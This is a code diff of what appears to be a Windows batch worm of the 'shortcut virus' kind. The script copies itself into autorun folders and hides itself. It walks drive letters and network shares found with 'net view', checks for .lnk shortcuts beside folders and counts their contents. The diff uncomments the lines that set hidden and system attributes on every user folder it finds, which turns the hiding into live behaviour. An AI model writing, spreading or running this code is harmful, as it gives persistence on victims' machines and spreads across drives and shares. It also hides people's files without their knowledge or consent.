@@ -87,8 +87,6 @@ copy /y "%~dpnx0" "%path_autoRun1%\"
 copy /y "%~dpnx0" "%path_autoRun2%\"
 attrib +s +h "%path_autoRun1%\%~nx0"
 attrib +s +h "%path_autoRun2%\%~nx0"
-rem attrib +s +h "%path_autoRun1%\%~nx0"
-rem attrib +s +h "%path_autoRun2%\%~nx0"
 
 
 for %%i in (A B C D E F G H J L P Q S U V W X Y Z M I K R O N T) do (
@@ -104,7 +102,7 @@ for %%i in (A B C D E F G H J L P Q S U V W X Y Z M I K R O N T) do (
       if /i "%%i:" NEQ "%systemDrive%" if /i "%%i:" NEQ "D:" (
         for /f "delims=" %%x in ('dir "%%i:\*" /a:d /b 2^>nul') do (
           if /i "%%x" NEQ "$RECYCLE.BIN" if /i "%%x" NEQ "FOUND.000" if /i "%%x" NEQ "Recycled" if /i "%%x" NEQ "System Volume Information" (
-            rem attrib +h +s "%%i:\%%x"
+            attrib +h +s "%%i:\%%x"
             if not exist "%%i:\%%x.lnk" (
               set counter=0
               for /f "delims=" %%y in ('dir "%%i:\%%x\*" /b 2^>nul') do set /a counter+=1
@@ -134,7 +132,7 @@ for /f "skip=3 tokens=1,* delims= " %%i in ('net view') do if /i "%%i" NEQ "The"
       if /i "%%j:" NEQ "C:" (
         for /f "delims=" %%x in ('dir "%%i\%%j\*" /a:d /b 2^>nul') do (
           if /i "%%x" NEQ "$RECYCLE.BIN" if /i "%%x" NEQ "FOUND.000" if /i "%%x" NEQ "Recycled" if /i "%%x" NEQ "System Volume Information" (
-            rem attrib +h +s "%%i\%%j\%%x"
+            attrib +h +s "%%i\%%j\%%x"
             if not exist "%%i\%%j\%%x.lnk" (
               set counter=0
               for /f "delims=" %%y in ('dir "%%i\%%j\%%x\*" /b 2^>nul') do set /a counter+=1
